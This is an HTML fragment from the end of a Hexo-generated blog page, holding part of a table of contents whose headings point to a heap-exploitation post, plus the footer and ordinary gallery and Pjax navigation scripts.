class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83"><span class="toc-number">1.4.1.</span> <span class="toc-text">堆内存分布</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.4.2.</span> <span class="toc-text">全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8Aexp"><span class="toc-number">1.4.3.</span> <span class="toc-text">攻击原理及exp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>